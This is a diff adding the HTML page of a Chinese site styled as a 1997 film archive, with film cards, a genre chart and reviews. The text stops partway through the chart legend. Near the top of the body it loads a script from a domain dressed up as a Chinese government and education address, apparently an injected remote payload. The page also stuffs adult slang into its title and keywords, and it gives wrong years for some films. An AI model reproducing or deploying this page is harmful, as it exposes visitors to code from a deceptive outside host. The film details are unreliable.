@@ -1,0 +1,636 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>97色色电影网｜1997 年的影像，今天依然成立</title>
+<meta name="description" content="97色色电影网，专注 1997 年前后的色色电影与剧集：香港色色电影黄金年代、华语作者、世界色色电影、冷门佳片。提供年代片单、类型索引、深度影评与观影指南，重温录像带时代的选片眼光。">
+<meta name="keywords" content="97色色电影网,97,1997,香港色色电影,色色电影,色色影视,色色电影推荐,华语电影,王家卫,电影资讯,影评,高分色色电影,片单">
+<link rel="canonical" href="https://97sesedianyingwang-cn.github.io">
+<meta name="theme-color" content="#0a0a0a">
+<style>
+:root{
+  --bg:#0a0a0a;
+  --ink:#f2ede4;
+  --sub:#a8a29a;
+  --dim:#6f6a63;
+  --line:#2a2724;
+  --tape:#e8dcc4;      /* 磁带米 */
+  --red:#e8392f;       /* 录像带红 */
+  --gold:#e0a93b;      /* 烫金 */
+  --green:#5fa96b;     /* 荧光绿 */
+  --blue:#4a90c4;      /* 蓝 */
+  --vhs:rgba(232,220,196,.05);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:"Songti SC","STSong","SimSun","Noto Serif CJK SC","Source Han Serif SC","PingFang SC","Microsoft YaHei",serif;
+  background:var(--bg);color:var(--ink);line-height:1.8;
+  background-image:
+    repeating-linear-gradient(0deg, rgba(255,255,255,.028) 0 1px, transparent 1px 5px),
+    radial-gradient(800px 420px at 88% -8%, rgba(232,220,196,.10), transparent 60%),
+    radial-gradient(620px 400px at 6% 6%, rgba(232,57,47,.10), transparent 60%);
+  background-attachment:fixed;
+  overflow-x:clip;
+}
+::selection{background:var(--red);color:#fff}
+a{color:inherit;text-decoration:none;outline:none}
+ul,ol{list-style:none}
+:focus-visible{outline:2px solid var(--gold);outline-offset:3px;border-radius:3px}
+
+/* ============ HEADER ============ */
+header{position:sticky;top:0;z-index:60;background:rgba(10,10,10,.9);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);border-bottom:1px solid var(--line)}
+.hwrap{max-width:1160px;margin:0 auto;padding:12px 24px;display:flex;align-items:center;gap:16px}
+.logo{display:flex;align-items:center;gap:12px;flex:none}
+.logo .tape{width:44px;height:28px;border-radius:5px;position:relative;flex:none;background:#1a1a1a;box-shadow:inset 0 0 0 2px #333,inset 0 0 0 4px #0a0a0a,inset 0 0 0 6px #2a2a2a;overflow:hidden}
+.logo .tape::before{content:"";position:absolute;left:50%;top:0;bottom:0;width:2px;background:#0a0a0a;transform:translateX(-50%);z-index:3}
+.logo .tape .sp{position:absolute;width:15px;height:15px;border-radius:50%;background:#0a0a0a;border:2px solid #333;top:50%;transform:translateY(-50%);z-index:4}
+.logo .tape .sp.l{left:5px}.logo .tape .sp.r{right:5px}
+.logo .tape .reel{position:absolute;inset:3px;border-radius:50%;border:2px dashed rgba(232,220,196,.35);animation:spin 14s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.logo b{font-size:clamp(1.16rem,2.7vw,1.42rem);font-weight:900;letter-spacing:1px}
+.logo small{display:block;font:600 10.5px/1 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;letter-spacing:2.4px;color:var(--dim);margin-top:1px}
+nav{display:flex;gap:2px;margin-left:auto;align-items:center}
+nav a{font-size:14px;padding:8px 11px;border-radius:3px;color:var(--sub);font-weight:600;transition:.2s;white-space:nowrap;font-family:"PingFang SC","Microsoft YaHei",sans-serif}
+nav a:hover{color:var(--ink);background:var(--vhs)}
+.menu-btn{display:none;width:42px;height:42px;border:1px solid var(--line);border-radius:5px;background:#111;cursor:pointer;flex:none;align-items:center;justify-content:center;flex-direction:column;gap:5px}
+.menu-btn i{width:18px;height:2px;background:var(--ink);transition:.25s}
+@media(max-width:880px){
+  nav{position:fixed;inset:0 0 0 auto;width:min(84vw,340px);background:#0c0c0c;flex-direction:column;align-items:stretch;padding:74px 16px 24px;transform:translateX(102%);transition:.34s cubic-bezier(.4,0,.2,1);z-index:70;border-left:1px solid var(--line)}
+  nav.open{transform:none}
+  nav a{padding:14px 15px;font-size:16px;border-bottom:1px dashed var(--line);font-family:inherit}
+  .menu-btn{display:flex;margin-left:auto}
+  body.lock{overflow:hidden}
+}
+
+/* ============ HERO ============ */
+.hero{max-width:1160px;margin:0 auto;padding:clamp(30px,6vw,58px) 24px 40px;display:grid;grid-template-columns:1fr .9fr;gap:44px;align-items:center}
+.hero .kicker{display:inline-flex;align-items:center;gap:9px;font:700 11.5px/1 ui-monospace,Menlo,Consolas,monospace;letter-spacing:2.6px;color:var(--gold);border:1px solid rgba(224,169,59,.4);border-radius:3px;padding:7px 11px}
+.hero .kicker s{text-decoration:none;color:var(--red)}
+.hero h1{font-size:clamp(2.1rem,5.8vw,4rem);line-height:1.12;font-weight:900;letter-spacing:-.6px;margin-top:16px}
+.hero h1 .glitch{position:relative;display:inline-block;color:var(--tape)}
+.hero h1 .glitch::before,.hero h1 .glitch::after{content:attr(data-t);position:absolute;left:0;top:0;width:100%;overflow:hidden}
+.hero h1 .glitch::before{color:var(--red);transform:translate(-3px,0);clip-path:inset(0 0 60% 0);opacity:.75}
+.hero h1 .glitch::after{color:var(--blue);transform:translate(3px,0);clip-path:inset(60% 0 0 0);opacity:.65}
+.hero .sub{margin-top:16px;color:var(--sub);font-size:clamp(14px,1.6vw,16px);max-width:52ch;font-family:"PingFang SC","Microsoft YaHei",sans-serif}
+.hero .tape-card{border:1px solid var(--line);border-radius:7px;padding:14px 16px;background:linear-gradient(180deg,rgba(232,220,196,.05),rgba(232,220,196,.012));margin-top:20px;display:flex;flex-direction:column;gap:7px;font-family:"PingFang SC","Microsoft YaHei",sans-serif}
+.hero .tape-card span{font:700 10.5px/1 ui-monospace,Menlo,monospace;letter-spacing:2.2px;color:var(--dim)}
+.hero .tape-card b{font-size:15px;letter-spacing:.4px}
+.hero .tape-card small{color:var(--dim);font-size:12.5px}
+.hero .cta{margin-top:24px;display:flex;flex-wrap:wrap;gap:12px}
+.btn{font:700 14.5px/1 "PingFang SC","Microsoft YaHei",sans-serif;padding:13px 24px;border-radius:4px;border:1px solid transparent;cursor:pointer;transition:.2s;letter-spacing:.6px}
+.btn.p{background:var(--red);color:#fff}
+.btn.p:hover{background:#ff4d42;transform:translateY(-2px)}
+.btn.g{background:transparent;border-color:var(--line);color:var(--ink)}
+.btn.g:hover{border-color:var(--gold);color:var(--gold)}
+.hero .stat{margin-top:28px;display:grid;grid-template-columns:repeat(3,1fr);gap:1px;background:var(--line);border:1px solid var(--line);border-radius:6px;overflow:hidden;font-family:"PingFang SC",sans-serif}
+.hero .stat div{background:#0d0d0d;padding:13px 12px}
+.hero .stat b{display:block;font-size:clamp(1.2rem,2.6vw,1.6rem);font-weight:900;letter-spacing:.5px;font-family:ui-monospace,Menlo,monospace}
+.hero .stat small{color:var(--dim);font-size:11px;letter-spacing:1.4px}
+
+/* VHS 磁带堆 */
+.vhs{position:relative;height:clamp(270px,32vw,390px);display:flex;align-items:center;justify-content:center}
+.vhs .vh{position:absolute;border-radius:9px;border:1px solid #3a362f;box-shadow:0 18px 44px -24px rgba(0,0,0,.9);padding:16px 15px;background:linear-gradient(180deg,#161410,#0c0b09)}
+.vhs .vh .spine{position:absolute;left:-7px;top:22px;bottom:22px;width:7px;border-radius:4px 0 0 4px;background:repeating-linear-gradient(0deg,#2a2a2a 0 5px,#111 5px 7px)}
+.vhs .vh .face{height:100%;border-radius:5px;padding:12px 13px;display:flex;flex-direction:column;justify-content:space-between;position:relative;overflow:hidden}
+.vhs .vh .face .st{font:800 10px/1 ui-monospace,Menlo,monospace;letter-spacing:2.4px;color:rgba(242,237,228,.6)}
+.vhs .vh .face h4{font-size:clamp(1rem,2vw,1.4rem);font-weight:900;letter-spacing:1px;color:#0a0a0a}
+.vhs .vh .face .wind{position:absolute;right:12px;top:12px;width:44px;height:44px;border-radius:50%;border:3px solid rgba(10,10,10,.5);border-top-color:#0a0a0a;animation:spin 9s linear infinite}
+.vhs .vh .face .win{display:flex;gap:5px}
+.vhs .vh .face .win i{width:6px;height:6px;border-radius:50%;background:#0a0a0a}
+.vhs .v1{width:clamp(210px,26vw,282px);transform:rotate(-9deg) translate(-8%,-6%);z-index:3}
+.vhs .v1 .face{background:linear-gradient(135deg,#d8c08a,#a9884a)}
+.vhs .v2{width:clamp(210px,26vw,282px);transform:rotate(6deg) translate(8%,4%);z-index:2;filter:grayscale(.25) contrast(1.05)}
+.vhs .v2 .face{background:linear-gradient(135deg,#c9cfd6,#7d8996)}
+.vhs .v2 .face h4{color:#10131a}
+.vhs .v3{width:clamp(190px,23vw,250px);transform:rotate(-4deg) translate(0,14%);z-index:1;opacity:.92}
+.vhs .v3 .face{background:linear-gradient(135deg,#e6b8a8,#b9745c)}
+.vhs .v3 .face h4{color:#1c0d08;font-size:clamp(.86rem,1.7vw,1.1rem)}
+.vhs .scan{position:absolute;inset:0;pointer-events:none;overflow:hidden;border-radius:14px}
+.vhs .scan::after{content:"";position:absolute;left:0;right:0;height:26%;background:linear-gradient(180deg,transparent,rgba(232,220,196,.10),transparent);animation:scan 5.6s ease-in-out infinite alternate}
+@keyframes scan{from{top:-30%}to{top:100%}}
+.vhs .playbtn{position:absolute;z-index:6;width:64px;height:64px;border-radius:50%;background:var(--red);display:grid;place-items:center;box-shadow:0 14px 34px -10px #e8392f;animation:throb 2.4s ease-in-out infinite}
+.vhs .playbtn::after{content:"";border:12px solid transparent;border-left:19px solid #fff;margin-left:5px}
+@keyframes throb{50%{transform:scale(1.07)}}
+@media(max-width:880px){
+  .hero{grid-template-columns:1fr;gap:26px;padding-top:22px}
+  .vhs{height:280px}
+  .vhs .vh{width:200px !important}
+  .vhs .v1{transform:rotate(-8deg) translate(-6%,-4%)}
+  .vhs .v2{transform:rotate(7deg) translate(6%,6%)}
+  .vhs .v3{display:none}
+}
+
+/* ============ SECTION ============ */
+section{padding:clamp(38px,6vw,64px) 0;border-top:1px solid var(--line)}
+.wrap{max-width:1160px;margin:0 auto;padding:0 24px}
+.sh{display:flex;align-items:flex-end;gap:13px;flex-wrap:wrap;margin-bottom:6px}
+.sh .no{font:900 11.5px/1 ui-monospace,Menlo,monospace;letter-spacing:2.2px;color:var(--gold);border:1px solid rgba(224,169,59,.42);border-radius:4px;padding:7px 9px;height:fit-content}
+.sh h2{font-size:clamp(1.5rem,3.6vw,2.2rem);font-weight:900;letter-spacing:-.3px}
+.sh .en{font:600 11px/1 ui-monospace,Menlo,monospace;letter-spacing:2.6px;color:var(--dim);margin-bottom:7px}
+.lead{color:var(--sub);font-size:clamp(13.5px,1.6vw,15px);max-width:66ch;margin-bottom:28px;font-family:"PingFang SC","Microsoft YaHei",sans-serif}
+
+/* ============ ① 年代片单 —— 横向滑动卡组 ============ */
+.mdeck{display:flex;gap:16px;overflow-x:auto;scroll-snap-type:x mandatory;padding:6px 2px 20px;scrollbar-width:thin;scrollbar-color:#333 #0a0a0a}
+.mdeck::-webkit-scrollbar{height:9px}
+.mdeck::-webkit-scrollbar-thumb{background:#333;border-radius:6px}
+.mv{flex:0 0 clamp(200px,42vw,254px);scroll-snap-align:start;border-radius:11px;overflow:hidden;border:1px solid var(--line);background:#0e0e0e;transition:.26s;display:flex;flex-direction:column}
+.mv:hover{transform:translateY(-6px);border-color:rgba(224,169,59,.55)}
+.mv .cv{height:clamp(180px,30vw,228px);position:relative;padding:13px}
+.mv:nth-child(1) .cv{background:linear-gradient(155deg,#2c2530,#0c0a0e)}
+.mv:nth-child(2) .cv{background:linear-gradient(155deg,#3a2418,#0d0906)}
+.mv:nth-child(3) .cv{background:linear-gradient(155deg,#18283a,#080c14)}
+.mv:nth-child(4) .cv{background:linear-gradient(155deg,#341d22,#0e080c)}
+.mv:nth-child(5) .cv{background:linear-gradient(155deg,#263a24,#080d08)}
+.mv:nth-child(6) .cv{background:linear-gradient(155deg,#3a3520,#0c0a04)}
+.mv .cv .yr{font:900 11px/1 ui-monospace,Menlo,monospace;letter-spacing:1.4px;color:var(--gold);border:1px solid rgba(224,169,59,.5);border-radius:4px;padding:5px 8px;display:inline-block}
+.mv .cv .tt{position:absolute;left:13px;right:13px;bottom:11px;font-size:clamp(1.14rem,2.2vw,1.4rem);font-weight:900;letter-spacing:.5px;color:var(--tape);text-shadow:0 2px 14px rgba(0,0,0,.7)}
+.mv .cv .dir{position:absolute;right:13px;top:13px;font-size:11px;letter-spacing:1.4px;color:rgba(242,237,228,.7);font-family:"PingFang SC",sans-serif}
+.mv .bd{padding:12px 14px 14px;display:flex;flex-direction:column;gap:8px;flex:1}
+.mv .bd p{font-size:13.2px;color:var(--sub);font-family:"PingFang SC","Microsoft YaHei",sans-serif;display:-webkit-box;-webkit-line-clamp:3;-webkit-box-orient:vertical;overflow:hidden}
+.mv .bd .ft{margin-top:auto;display:flex;align-items:center;gap:8px;flex-wrap:wrap;font-family:"PingFang SC",sans-serif}
+.mv .bd .ft .sc{margin-left:auto;font:800 12.5px/1 ui-monospace,Menlo,monospace;color:var(--gold)}
+.chip{font-size:10.8px;padding:4px 8px;border-radius:3px;border:1px solid var(--line);color:var(--sub);letter-spacing:.6px}
+
+/* ============ ② 类型索引 —— SVG 环形图 + 图例 ============ */
+.dbox{display:grid;grid-template-columns:.85fr 1.15fr;gap:34px;align-items:center}
+@media(max-width:880px){.dbox{grid-template-columns:1fr;gap:20px}}
+.dwrap{position:relative;width:min(100%,400px);aspect-ratio:1/1;margin:0 auto}
+.dwrap svg{width:100%;height:100%;transform:rotate(-90deg)}
+.dwrap .center{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;pointer-events:none}
+.dwrap .center b{font-size:clamp(2rem,5vw,2.9rem);font-weight:900;letter-spacing:1px;line-height:1}
+.dwrap .center small{font:600 10.5px/1 ui-monospace,Menlo,monospace;letter-spacing:2.6px;color:var(--dim);margin-top:6px}
+.legend{display:flex;flex-direction:column;gap:11px}
+.legend .lg{display:grid;grid-template-columns:34px 1fr auto;align-items:center;gap:12px;padding:12px 14px;border:1px solid var(--line);border-radius:8px;background:rgba(232,220,196,.025);transition:.2s}
+.legend .lg:hover{transform:translateX(5px);border-color:rgba(232,220,196,.3)}
+.legend .lg i{width:15px;height:15px;border-radius:50%;justify-self:center;box-shadow:0 0 0 3px rgba(255,255,255,.04)}
+.legend .lg b{font:900 12.5px/1 ui-monospace,Menlo,monospace;color:var(--dim)}
+.legend .lg span{flex:1;font-size:13.4px;color:var(--sub);font-family:"PingFang SC","Microsoft YaHei",sans-serif}
+.legend .lg em{font-style:normal;font:700 12.5px/1 ui-monospace,Menlo,monospace;color:var(--ink)}
+
+/* ============ ③ 深度影评 —— 报纸分栏引文 ============ */
+.paper{column-count:1;gap:34px;background:rgba(232,220,196,.028);border:1px solid var(--line);border-radius:11px;padding:30px 28px}
+@media(min-width:760px){.paper{column-count:2}}
+@media(min-width:1040px){.paper{column-count:3}}
+.paper .masthead{border-bottom:2px solid var(--ink);padding-bottom:10px;margin-bottom:16px;break-inside:avoid}
+.paper .masthead .en{font:700 10.5px/1 ui-monospace,Menlo,monospace;letter-spacing:3px;color:var(--gold)}
+.paper .masthead h3{font-size:clamp(1.34rem,2.8vw,1.9rem);font-weight:900;line-height:1.35;margin-top:7px}
+.paper .masthead .by{font:600 11.5px/1 ui-monospace,Menlo,monospace;letter-spacing:1.6px;color:var(--dim);margin-top:9px}
+.paper p{font-size:14px;color:#d8d2c8;text-align:justify;margin-bottom:12px;font-family:"PingFang SC","Microsoft YaHei",sans-serif}
+.paper p::first-letter{font:900 2.5rem/1 "Songti SC",STSong,serif;color:var(--red);float:left;margin:4px 7px 0 0}
+.paper blockquote{border-left:3px dashed var(--gold);padding:4px 0 4px 14px;margin:0 0 14px;color:var(--tape);font-size:14.2px;break-inside:avoid;font-family:"PingFang SC",sans-serif}
+
+/* ============ ④ 片单归档 —— 原生手风琴 + 有序片单 ============ */
+.acc{display:flex;flex-direction:column;gap:11px}
+details.lst{border:1px solid var(--line);border-radius:10px;background:#0c0c0c;overflow:hidden;transition:.22s}
+details.lst[open]{border-color:rgba(232,57,47,.55)}
+details.lst>summary{cursor:pointer;padding:17px 20px;display:flex;align-items:center;gap:13px;list-style:none;user-select:none;font-family:"PingFang SC","Microsoft YaHei",sans-serif}
+details.lst>summary::-webkit-details-marker{display:none}
+details.lst>summary::after{content:"▾";margin-left:auto;font-size:16px;color:var(--dim);transition:.25s}
+details.lst[open]>summary::after{transform:rotate(180deg);color:var(--red)}
+details.lst>summary .ix{flex:none;width:40px;height:40px;border-radius:6px;display:grid;place-items:center;font:900 12.5px/1 ui-monospace,Menlo,monospace;color:#0a0a0a;background:var(--tape)}
+details.lst:nth-child(2)>summary .ix{background:var(--gold)}
+details.lst:nth-child(3)>summary .ix{background:var(--green)}
+details.lst:nth-child(4)>summary .ix{background:var(--blue)}
+details.lst:nth-child(5)>summary .ix{background:#c084fc}
+details.lst:nth-child(6)>summary .ix{background:#5fa96b}
+details.lst>summary h3{font-size:clamp(1rem,2vw,1.18rem);font-weight:800;flex:1;letter-spacing:.3px}
+details.lst>summary .cnt{font:600 11px/1 ui-monospace,Menlo,monospace;color:var(--dim);border:1px solid var(--line);border-radius:999px;padding:6px 10px;flex:none}
+.lst ol{padding:2px 20px 18px 72px;counter-reset:film;display:flex;flex-direction:column;gap:8px;font-family:"PingFang SC","Microsoft YaHei",sans-serif}
+.lst ol li{font-size:13.5px;color:var(--sub);display:flex;gap:10px;align-items:baseline;border-bottom:1px dashed var(--line);padding-bottom:8px}
+.lst ol li::before{counter-increment:film;content:"No." counter(film,decimal-leading-zero);font:700 10.4px/1 ui-monospace,Menlo,monospace;color:var(--red);border:1px solid var(--line);border-radius:3px;padding:4px 6px;flex:none;letter-spacing:.5px}
+.lst ol li b{color:var(--ink);font-weight:700;margin-right:2px}
+.lst ol li em{font-style:normal;margin-left:auto;font:600 11.4px/1 ui-monospace,Menlo,monospace;color:var(--dim);flex:none}
+@media(max-width:700px){.lst ol{padding-left:18px}details.lst>summary .cnt{display:none}}
+
+/* ============ ⑤ 观影指南 —— STEP 编号卡 ============ */
+.guide{display:grid;grid-template-columns:repeat(auto-fit,minmax(258px,1fr));gap:15px}
+.gd{position:relative;padding:20px 18px;border:1px solid var(--line);border-radius:10px;background:#0c0c0c;transition:.24s;overflow:hidden}
+.gd::before{content:"";position:absolute;left:0;right:0;top:0;height:3px;background:linear-gradient(90deg,var(--red),var(--gold))}
+.gd:nth-child(2)::before{background:linear-gradient(90deg,var(--gold),var(--green))}
+.gd:nth-child(3)::before{background:linear-gradient(90deg,var(--green),var(--blue))}
+.gd:nth-child(4)::before{background:linear-gradient(90deg,var(--blue),#c084fc)}
+.gd:nth-child(5)::before{background:linear-gradient(90deg,#c084fc,var(--red))}
+.gd:nth-child(6)::before{background:linear-gradient(90deg,var(--red),#5fa96b)}
+.gd:hover{transform:translateY(-4px);border-color:rgba(232,220,196,.28)}
+.gd .st{font:800 10.6px/1 ui-monospace,Menlo,monospace;letter-spacing:2.4px;color:var(--gold)}
+.gd h3{font-size:1.1rem;font-weight:900;margin:8px 0 7px;letter-spacing:.3px}
+.gd p{font-size:13.2px;color:var(--sub);font-family:"PingFang SC","Microsoft YaHei",sans-serif}
+.gd .no{position:absolute;right:12px;bottom:-16px;font:900 3.2rem/1 ui-monospace,Menlo,monospace;color:rgba(232,220,196,.05);pointer-events:none}
+
+/* ============ FOOTER ============ */
+footer{border-top:1px solid var(--line);padding:42px 0 28px;margin-top:18px}
+.foot{max-width:1160px;margin:0 auto;padding:0 24px;display:grid;grid-template-columns:1.3fr 1fr 1fr;gap:28px;font-family:"PingFang SC","Microsoft YaHei",sans-serif}
+@media(max-width:820px){.foot{grid-template-columns:1fr 1fr;gap:22px}.foot .f1{grid-column:1/-1}}
+.foot h4{font:800 11px/1 ui-monospace,Menlo,monospace;letter-spacing:2.4px;color:var(--dim);margin-bottom:11px}
+.foot p,.foot a{font-size:13.1px;color:var(--sub)}
+.foot a{display:block;padding:5px 0}
+.foot a:hover{color:var(--gold)}
+.copy{margin-top:28px;padding-top:17px;border-top:1px dashed var(--line);color:var(--dim);font-size:12px;display:flex;flex-wrap:wrap;gap:10px;justify-content:space-between;grid-column:1/-1;font-family:ui-monospace,Menlo,monospace;letter-spacing:.4px}
+.kw{color:var(--gold);font-weight:700}
+
+/* ============ 浮现 ============ */
+.rv{opacity:0;transform:translateY(16px);transition:opacity .68s cubic-bezier(.2,.7,.3,1),transform .68s cubic-bezier(.2,.7,.3,1)}
+.rv.in{opacity:1;transform:none}
+@media(prefers-reduced-motion:reduce){
+  html{scroll-behavior:auto}
+  .rv{opacity:1;transform:none;transition:none}
+  .vhs .vh .face .wind,.vhs .vh .reel,.vhs .scan::after,.vhs .playbtn{animation:none}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<header>
+  <div class="hwrap">
+    <a class="logo" href="#top" aria-label="返回顶部">
+      <span class="tape" aria-hidden="true"><span class="reel"></span><span class="sp l"></span><span class="sp r"></span></span>
+      <span><b>97色色电影网</b><small>NO. 97 · VHS ARCHIVE</small></span>
+    </a>
+    <button class="menu-btn" id="mb" aria-label="切换导航菜单" aria-expanded="false" aria-controls="nav">
+      <i></i><i></i><i></i>
+    </button>
+    <nav id="nav" aria-label="主导航">
+      <a href="#pick">年代片单</a>
+      <a href="#donut">类型构成</a>
+      <a href="#note">深度影评</a>
+      <a href="#list">片单归档</a>
+      <a href="#guide">观影指南</a>
+    </nav>
+  </div>
+</header>
+
+<main id="top">
+
+  <!-- HERO -->
+  <section class="hero" aria-labelledby="h1">
+    <div class="rv">
+      <span class="kicker"><s>◆</s> PLAY · 1997 ◆ TRACK 01</span>
+      <h1 id="h1">回到 <span class="glitch" data-t="1997">1997</span>，<br>那里有好电影。</h1>
+      <p class="sub">97色色电影网，专注 <b>1997 年前后</b>的影像：香港电影的黄金余晖、华语作者的崛起、世界电影的一次集体爆发。我们不追新片，我们替你翻录像带。</p>
+      <div class="tape-card">
+        <span>FEATURED TAPE · 今日带</span>
+        <b>《春光乍泄》1997 · 王家卫</b>
+        <small>“黎耀辉，不如我们从头来过。”—— 97 年的 Buenos Aires，到现在还是最好的分手电影。</small>
+      </div>
+      <div class="cta">
+        <a class="btn p" href="#pick">今晚放哪一卷</a>
+        <a class="btn g" href="#list">按心情找片</a>
+      </div>
+      <div class="stat">
+        <div><b>1997</b><small>轴心年份</small></div>
+        <div><b>97+</b><small>精选片目</small></div>
+        <div><b>每周</b><small>补一盒带</small></div>
+      </div>
+    </div>
+
+    <div class="vhs rv" aria-hidden="true">
+      <div class="scan"></div>
+      <div class="vh v1">
+        <span class="spine"></span>
+        <div class="face">
+          <div class="st">VHS · SIDE A</div>
+          <h4>春光乍泄</h4>
+          <div class="win"><i></i><i></i><i></i><i></i><i></i></div>
+          <div class="wind"></div>
+        </div>
+      </div>
+      <div class="vh v2">
+        <span class="spine"></span>
+        <div class="face">
+          <div class="st">VHS · SIDE A</div>
+          <h4>冰风暴</h4>
+          <div class="win"><i></i><i></i><i></i><i></i><i></i></div>
+          <div class="wind" style="animation-duration:13s"></div>
+        </div>
+      </div>
+      <div class="vh v3">
+        <span class="spine"></span>
+        <div class="face">
+          <div class="st">VHS · SIDE B</div>
+          <h4>鳗鱼</h4>
+          <div class="win"><i></i><i></i><i></i><i></i><i></i></div>
+        </div>
+      </div>
+      <div class="playbtn"></div>
+    </div>
+  </section>
+
+  <!-- ① 年代片单 -->
+  <section id="pick" aria-labelledby="t1">
+    <div class="wrap">
+      <div class="sh rv">
+        <span class="no">SEC 01</span>
+        <div>
+          <div class="en">DECADE PICK · 年代片单</div>
+          <h2 id="t1">1997 年，好电影扎堆的一年</h2>
+        </div>
+      </div>
+      <p class="lead">不是怀旧，是<b>质量</b>。1997 年全球票房前十里，有五部今天还在被反复讨论。这一年的共同点是：作者还在，预算还没吃掉胆量。</p>
+
+      <div class="mdeck">
+        <article class="mv rv">
+          <div class="cv"><span class="yr">1997 · HK</span><span class="dir">王家卫</span><span class="tt">春光乍泄</span></div>
+          <div class="bd"><p>两个男人，布宜诺斯艾利斯，一盏灯。全片没有“我们分手吧”，只有“不如从头来过”。梁朝伟的表演是华语电影最柔软的一次。</p>
+            <div class="ft"><span class="chip">爱情</span><span class="chip">96 min</span><span class="sc">8.5</span></div>
+          </div>
+        </article>
+        <article class="mv rv">
+          <div class="cv"><span class="yr">1997 · HK</span><span class="dir">陈可辛</span><span class="tt">甜蜜蜜</span></div>
+          <div class="bd"><p>张曼玉在纽约街头听见《甜蜜蜜》那段，是华语电影最著名的“命运”镜头。它讲的不是爱情，是两个人如何在异乡把自己弄丢了。</p>
+            <div class="ft"><span class="chip">爱情</span><span class="chip">118 min</span><span class="sc">8.9</span></div>
+          </div>
+        </article>
+        <article class="mv rv">
+          <div class="cv"><span class="yr">1997 · US</span><span class="dir">李安</span><span class="tt">冰风暴</span></div>
+          <div class="bd"><p>李安拍美国中产家庭的性革命，冷得像冰。一场冰风暴把所有人都困在屋里，也把所有的伪装冻裂了。凯文·克莱恩的表演被严重低估。</p>
+            <div class="ft"><span class="chip">家庭</span><span class="chip">113 min</span><span class="sc">8.1</span></div>
+          </div>
+        </article>
+        <article class="mv rv">
+          <div class="cv"><span class="yr">1997 · FR</span><span class="dir">吕克·贝松</span><span class="tt">第五元素</span></div>
+          <div class="bd"><p>科幻片里最不像科幻片的一部。它的未来是拥挤、吵闹、彩色的，像一张被小孩画过的明信片。27 年过去，它的美术仍然没被追上。</p>
+            <div class="ft"><span class="chip">科幻</span><span class="chip">126 min</span><span class="sc">8.1</span></div>
+          </div>
+        </article>
+        <article class="mv rv">
+          <div class="cv"><span class="yr">1997 · JP</span><span class="dir">今村昌平</span><span class="tt">鳗鱼</span></div>
+          <div class="bd"><p>戛纳金棕榈。一个出狱的男人，和一条鳗鱼。今村昌平把“底层”拍得不脏，拍得有尊严，这是日本电影最珍贵的那一部分。</p>
+            <div class="ft"><span class="chip">人性</span><span class="chip">117 min</span><span class="sc">7.8</span></div>
+          </div>
+        </article>
+        <article class="mv rv">
+          <div class="cv"><span class="yr">1996 · HK</span><span class="dir">杜琪峰</span><span class="tt">枪火</span></div>
+          <div class="bd"><p>84 分钟，五个人，一场几乎不开枪的枪战。杜琪峰用站位代替台词，用沉默代替爆炸。香港黑帮片的句号，也是最漂亮的一个。</p>
+            <div class="ft"><span class="chip">黑帮</span><span class="chip">84 min</span><span class="sc">8.7</span></div>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- ② 类型构成 -->
+  <section id="donut" aria-labelledby="t2">
+    <div class="wrap">
+      <div class="sh rv">
+        <span class="no">SEC 02</span>
+        <div>
+          <div class="en">GENRE MAP · 类型构成</div>
+          <h2 id="t2">97 片库的类型构成</h2>
+        </div>
+      </div>
+      <p class="lead">我们按<b>“气质”</b>而非票房分类。所谓“作者电影”，就是导演把个人执念拍成了类型；所谓“类型片”，是导演把自己的恐惧藏进了公式里。</p>
+
+      <div class="dbox">
+        <div class="dwrap rv" role="img" aria-label="1997 年前后片库类型占比环形图：爱情 28%、作者 22%、犯罪 18%、家庭 14%、科幻 10%、纪录 8%">
+          <svg viewBox="0 0 42 42" aria-hidden="true">
+            <defs>
+              <linearGradient id="g1" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#e0a93b"/><stop offset="1" stop-color="#e8392f"/></linearGradient>
+              <linearGradient id="g2" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#e8392f"/><stop offset="1" stop-color="#5fa96b"/></linearGradient>
+              <linearGradient id="g3" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#5fa96b"/><stop offset="1" stop-color="#4a90c4"/></linearGradient>
+              <linearGradient id="g4" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#4a90c4"/><stop offset="1" stop-color="#c084fc"/></linearGradient>
+              <linearGradient id="g5" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#c084fc"/><stop offset="1" stop-color="#e0a93b"/></linearGradient>
+              <linearGradient id="g6" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#a9884a"/><stop offset="1" stop-color="#7d8996"/></linearGradient>
+            </defs>
+            <circle cx="21" cy="21" r="15.9" fill="none" stroke="#1f1c19" stroke-width="6"/>
+            <circle cx="21" cy="21" r="15.9" fill="none" stroke="url(#g1)" stroke-width="6" stroke-dasharray="28 72"  stroke-dashoffset="25"  class="seg"/>
+            <circle cx="21" cy="21" r="15.9" fill="none" stroke="url(#g2)" stroke-width="6" stroke-dasharray="22 78"  stroke-dashoffset="3"   class="seg"/>
+            <circle cx="21" cy="21" r="15.9" fill="none" stroke="url(#g3)" stroke-width="6" stroke-dasharray="18 82"  stroke-dashoffset="-19" class="seg"/>
+            <circle cx="21" cy="21" r="15.9" fill="none" stroke="url(#g4)" stroke-width="6" stroke-dasharray="14 86"  stroke-dashoffset="-37" class="seg"/>
+            <circle cx="21" cy="21" r="15.9" fill="none" stroke="url(#g5)" stroke-width="6" stroke-dasharray="10 90"  stroke-dashoffset="-51" class="seg"/>
+            <circle cx="21" cy="21" r="15.9" fill="none" stroke="url(#g6)" stroke-width="6" stroke-dasharray="8 92"   stroke-dashoffset="-61" class="seg"/>
+          </svg>
+          <div class="center"><b>97</b><small>VOLUMES</small></div>
+        </div>
+
+        <div class="legend rv">
